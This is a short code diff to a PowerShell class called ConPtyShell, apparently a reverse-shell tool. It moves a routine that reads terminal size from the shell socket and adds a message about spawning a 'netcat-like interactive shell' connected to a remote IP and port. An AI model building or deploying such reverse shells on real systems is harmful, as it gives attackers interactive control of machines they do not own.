@@ -1021,6 +1021,8 @@ class ConPtyShell {
         # TODO Write CreatePseudoConsle part
         if ($false) { #$conptyCompatible) {
             Write-Host "CreatePseudoConsole function found! Spawning a fully interactive shell" -ForegroundColor Green
+
+            [ConPtyShell]::TryParseRowsColsFromSocket($shellSocket, [ref] $rows, [ref] $cols)
         } else {
 
             if ($upgradeShell) {
@@ -1033,10 +1035,10 @@ class ConPtyShell {
                 Write-Host "ConPtyShellException: Could not connect to ip $remoteIp on port $remotePort" -ForegroundColor Red
                 return ""
             }
-            [ConPtyShell]::TryParseRowsColsFromSocket($shellSocket, [ref] $rows, [ref] $cols)
 
-            Write-Host "cols: $cols"
-            Write-Host "rows: $rows"
+            Write-Host "CreatePseudoConsole function not found! Spawning a netcat-like interactive shell..." -ForegroundColor Yellow
+
+                        
         }
 
 
